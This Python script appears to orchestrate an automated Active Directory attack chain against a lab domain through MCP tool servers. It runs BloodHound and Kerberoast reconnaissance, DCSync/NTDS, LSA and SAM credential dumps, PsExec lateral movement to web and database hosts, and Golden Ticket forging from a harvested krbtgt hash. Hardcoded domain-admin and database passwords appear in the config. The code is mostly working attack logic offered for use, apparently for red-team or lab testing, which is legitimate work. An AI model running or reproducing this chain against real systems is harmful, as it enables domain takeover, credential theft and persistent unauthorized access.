#!/usr/bin/env python3
"""Athena direct-MCP attack chain against corp.athena.lab.

Runs inside backend container so MCP tool URLs (http://mcp-*:8080/mcp)
resolve through the docker network. Use:

    docker compose exec -T backend python3 /path/to/this.py <stage>

Stages: A (recon), B (creds), C (web01), D (db01), E (golden), all, list

All output is JSON-per-line. Facts are persisted to operation
790d345a-3209-4a97-ba7a-7412cebec633 in the facts table.
"""
import asyncio
import json
import os
import sys
import time
import uuid

# ----------------------------------------------------------------------
# Config
# ----------------------------------------------------------------------
OPERATION_ID = "790d345a-3209-4a97-ba7a-7412cebec633"
DC_IP = "192.168.0.16"
WEB_IP = "192.168.0.20"
DB_IP = "192.168.0.23"
DOMAIN = "corp.athena.lab"
NETBIOS = "CORP"
DA_USER = "administrator"
DA_PW = "1qaz@WSX"


def stamp():
    return time.strftime("%H:%M:%S")


def log(msg):
    print(f"[{stamp()}] {msg}", flush=True)


# ----------------------------------------------------------------------
# MCP client helper
# ----------------------------------------------------------------------
async def call_mcp(server, tool, args, timeout=300):
    """Invoke MCP tool via streamable-http, return raw content text."""
    from mcp.client.streamable_http import streamablehttp_client
    from mcp import ClientSession

    url = f"http://mcp-{server}:8080/mcp"
    try:
        async with streamablehttp_client(url) as (r, w, _):
            async with ClientSession(r, w) as s:
                await asyncio.wait_for(s.initialize(), timeout=15)
                result = await asyncio.wait_for(
                    s.call_tool(tool, args), timeout=timeout
                )
                if result.content:
                    return result.content[0].text
                return "{}"
    except Exception as e:
        return json.dumps({"facts": [], "raw_output": "", "error": f"{type(e).__name__}: {e}"})


async def list_server_tools(server):
    """Return list of (name, schema) tuples for a server."""
    from mcp.client.streamable_http import streamablehttp_client
    from mcp import ClientSession

    url = f"http://mcp-{server}:8080/mcp"
    try:
        async with streamablehttp_client(url) as (r, w, _):
            async with ClientSession(r, w) as s:
                await asyncio.wait_for(s.initialize(), timeout=15)
                t = await s.list_tools()
                return [(tool.name, tool.inputSchema) for tool in t.tools]
    except Exception as e:
        return [("_error_", str(e))]


# ----------------------------------------------------------------------
# DB fact writer
# ----------------------------------------------------------------------
async def write_facts(facts_list, source_target_ip=None):
    """Insert a list of {trait, value} into facts table."""
    if not facts_list:
        return 0
    try:
        import asyncpg
    except ImportError:
        log("(asyncpg missing, skipping fact writeback)")
        return 0

    dsn = os.environ.get("DATABASE_URL", "postgresql://athena:athena_secret@postgres:5432/athena")
    conn = await asyncpg.connect(dsn)
    try:
        target_id = None
        if source_target_ip:
            target_id = await conn.fetchval(
                "SELECT id FROM targets WHERE operation_id=$1 AND ip_address=$2",
                OPERATION_ID, source_target_ip,
            )
        written = 0
        for f in facts_list:
            trait = f.get("trait")
            value = f.get("value")
            if not trait or not value:
                continue
            # Truncate value to a sane size (DB has TEXT but keep logs readable)
            value_str = value if isinstance(value, str) else json.dumps(value)
            value_str = value_str[:8000]
            try:
                await conn.execute(
                    """INSERT INTO facts (trait, value, category, operation_id, source_target_id, score, collected_at)
                       VALUES ($1, $2, $3, $4, $5, $6, NOW())
                       ON CONFLICT (operation_id, trait, value) DO NOTHING""",
                    trait, value_str,
                    "ad" if trait.startswith("ad.") else ("credential" if trait.startswith("credential.") else "host"),
                    OPERATION_ID, target_id, 5,
                )
                written += 1
            except Exception as exc:
                log(f"  (fact insert failed for trait={trait}: {exc})")
        return written
    finally:
        await conn.close()


async def run_step(label, server, tool, args, target_ip=None, timeout=300):
    """Call MCP tool, parse result, write facts, return parsed dict."""
    log(f"→ {label}")
    log(f"  server={server} tool={tool} args={json.dumps({k: (v if k!='password' else '***') for k,v in args.items()})[:200]}")
    raw = await call_mcp(server, tool, args, timeout=timeout)
    try:
        parsed = json.loads(raw)
    except json.JSONDecodeError:
        parsed = {"facts": [], "raw_output": raw, "error": "non-JSON response"}

    facts = parsed.get("facts", [])
    err = parsed.get("error")
    if err:
        log(f"  ERROR: {err}")
    log(f"  facts_count={len(facts)}")
    if facts:
        # Log first 3 to avoid spam
        for f in facts[:3]:
            log(f"    + {f.get('trait')}: {str(f.get('value',''))[:100]}")
        if len(facts) > 3:
            log(f"    ... and {len(facts) - 3} more")
    raw_out = parsed.get("raw_output", "")
    if raw_out and not facts:
        log(f"  raw (first 200): {raw_out[:200]}")

    if facts:
        n = await write_facts(facts, source_target_ip=target_ip)
        log(f"  {n} facts persisted to DB")
    return parsed


# ----------------------------------------------------------------------
# Stage A — Recon
# ----------------------------------------------------------------------
async def stage_a():
    log("=" * 70)
    log("STAGE A — Recon + AD enumeration")
    log("=" * 70)

    # A1: BloodHound
    await run_step(
        "A1. BloodHound collect",
        "bloodhound-collector", "bloodhound_collect",
        {
            "target_dc": DC_IP,
            "username": DA_USER,
            "password": DA_PW,
            "domain": DOMAIN,
            "collect_method": "All",
        },
        target_ip=DC_IP, timeout=300,
    )

    # A2: Kerberoast (via credential-dumper) — need user with creds
    await run_step(
        "A2. Kerberoast SPN hashes",
        "credential-dumper", "kerberoast",
        {
            "target": DC_IP,
            "username": DA_USER,
            "password": DA_PW,
            "domain": DOMAIN,
        },
        target_ip=DC_IP,
    )

    # A3: Certipy find
    await run_step(
        "A3. Certipy find (ESC1/8)",
        "certipy-ad", "certipy_find",
        {
            "target_dc": DC_IP,
            "username": DA_USER,
            "password": DA_PW,
            "domain": DOMAIN,
        },
        target_ip=DC_IP,
    )


# ----------------------------------------------------------------------
# Stage B — Credential harvest (DCSync, Kerberoast crack, AS-REP)
# ----------------------------------------------------------------------
async def stage_b():
    log("=" * 70)
    log("STAGE B — Credential harvest")
    log("=" * 70)

    # B1: DCSync / NTDS dump
    await run_step(
        "B1. DCSync / dump NTDS.dit",
        "credential-dumper", "dump_ntds",
        {
            "target": DC_IP,
            "username": DA_USER,
            "password": DA_PW,
            "domain": DOMAIN,
        },
        target_ip=DC_IP, timeout=600,
    )

    # B2: AS-REP roast (GetNPUsers) - supported by impacket-ad or credential-dumper
    # Try impacket-ad first (has kerberoast but may lack as-rep); fall back.
    # We know legacy_kev has DONT_REQ_PREAUTH set. Pass users_file or try enumeration.
    await run_step(
        "B2. AS-REP roast (GetNPUsers)",
        "impacket-ad", "impacket_get_tgt",  # may not be right - will fall through with error
        {
            "target_dc": DC_IP,
            "domain": DOMAIN,
            "username": "legacy_kev",
            "password_or_hash": "",  # AS-REP needs no pre-auth
        },
        target_ip=DC_IP,
    )


# ----------------------------------------------------------------------
# Stage C — WEB01 compromise
# ----------------------------------------------------------------------
async def stage_c():
    log("=" * 70)
    log("STAGE C — WEB01 lateral move + LSA secrets")
    log("=" * 70)

    await run_step(
        "C1. PsExec → WEB01",
        "lateral-mover", "psexec_lateral",
        {
            "target": WEB_IP,
            "username": DA_USER,
            "password_or_hash": DA_PW,
            "domain": DOMAIN,
            "command": "whoami && hostname && ipconfig | findstr IPv4",
        },
        target_ip=WEB_IP, timeout=120,
    )

    await run_step(
        "C2. WEB01 LSA secrets (LSASS)",
        "credential-dumper", "dump_lsa_secrets",
        {
            "target": WEB_IP,
            "username": DA_USER,
            "password": DA_PW,
            "domain": DOMAIN,
        },
        target_ip=WEB_IP,
    )


# ----------------------------------------------------------------------
# Stage D — DB01 compromise
# ----------------------------------------------------------------------
async def stage_d():
    log("=" * 70)
    log("STAGE D — ACCT-DB01 lateral move + SAM dump")
    log("=" * 70)

    await run_step(
        "D1. PsExec → ACCT-DB01",
        "lateral-mover", "psexec_lateral",
        {
            "target": DB_IP,
            "username": DA_USER,
            "password_or_hash": DA_PW,
            "domain": DOMAIN,
            "command": "whoami && hostname",
        },
        target_ip=DB_IP, timeout=120,
    )

    await run_step(
        "D2. ACCT-DB01 SAM hashes",
        "credential-dumper", "dump_sam_hashes",
        {
            "target": DB_IP,
            "username": DA_USER,
            "password": DA_PW,
            "domain": DOMAIN,
        },
        target_ip=DB_IP,
    )

    await run_step(
        "D3. ACCT-DB01 LSA secrets",
        "credential-dumper", "dump_lsa_secrets",
        {
            "target": DB_IP,
            "username": DA_USER,
            "password": DA_PW,
            "domain": DOMAIN,
        },
        target_ip=DB_IP,
    )


# ----------------------------------------------------------------------
# Stage E — Golden Ticket proof (requires krbtgt hash from B1)
# ----------------------------------------------------------------------
async def stage_e():
    log("=" * 70)
    log("STAGE E — Golden Ticket (persistence demo)")
    log("=" * 70)

    # Pull krbtgt hash + domain SID from DB (Stage B1 should have written these)
    import asyncpg
    dsn = os.environ.get("DATABASE_URL", "postgresql://athena:athena_secret@postgres:5432/athena")
    conn = await asyncpg.connect(dsn)
    try:
        rows = await conn.fetch(
            "SELECT trait, value FROM facts WHERE operation_id=$1 AND collected_at > NOW() - INTERVAL '1 hour' AND (trait LIKE 'credential.hash%' OR trait='ad.domain_sid' OR trait='credential.domain_hash' OR trait LIKE '%krbtgt%')",
            OPERATION_ID,
        )
    finally:
        await conn.close()

    krbtgt_hash = None
    domain_sid = None
    for r in rows:
        v = r["value"]
        if "krbtgt" in v.lower():
            # typical format: krbtgt:502:aad3b435...:nthash::: or krbtgt/CORP.ATHENA.LAB:...
            parts = v.split(":")
            # Find 32-char hex nthash
            for p in parts:
                if len(p) == 32 and all(c in "0123456789abcdefABCDEF" for c in p):
                    krbtgt_hash = p
                    break
        if r["trait"] == "ad.domain_sid":
            domain_sid = v

    log(f"  krbtgt_hash={krbtgt_hash or 'NOT_FOUND'}")
    log(f"  domain_sid={domain_sid or 'NOT_FOUND'}")
    if not krbtgt_hash or not domain_sid:
        log("  Skipping Golden Ticket — prerequisites missing from Stage B")
        return

    await run_step(
        "E1. Forge Golden Ticket",
        "impacket-ad", "impacket_golden_ticket",
        {
            "target_dc": DC_IP,
            "domain": DOMAIN,
            "domain_sid": domain_sid,
            "krbtgt_hash": krbtgt_hash,
            "user": "fakeadmin",
        },
        target_ip=DC_IP,
    )


# ----------------------------------------------------------------------
# Tool inventory
# ----------------------------------------------------------------------
async def inventory():
    servers = [
        "bloodhound-collector", "credential-dumper", "certipy-ad",
        "impacket-ad", "ad-exploiter", "lateral-mover",
        "netexec-suite", "hashcat-crack", "ad-persistence",
        "responder-capture", "privesc-scanner",
    ]
    for srv in servers:
        tools = await list_server_tools(srv)
        log(f"== {srv} ==")
        for t in tools[:30]:
            if t[0] == "_error_":
                log(f"  ERROR: {t[1]}")
                continue
            name, schema = t
            props = list((schema or {}).get("properties", {}).keys()) if schema else []
            log(f"  {name}  params={props}")


# ----------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------
async def main():
    stage = sys.argv[1] if len(sys.argv) > 1 else "all"
    if stage == "list":
        await inventory()
        return
    if stage in ("A", "a"):
        await stage_a()
    elif stage in ("B", "b"):
        await stage_b()
    elif stage in ("C", "c"):
        await stage_c()
    elif stage in ("D", "d"):
        await stage_d()
    elif stage in ("E", "e"):
        await stage_e()
    elif stage == "all":
        await stage_a()
        await stage_b()
        await stage_c()
        await stage_d()
        await stage_e()
    else:
        log(f"unknown stage: {stage}")


if __name__ == "__main__":
    asyncio.run(main())
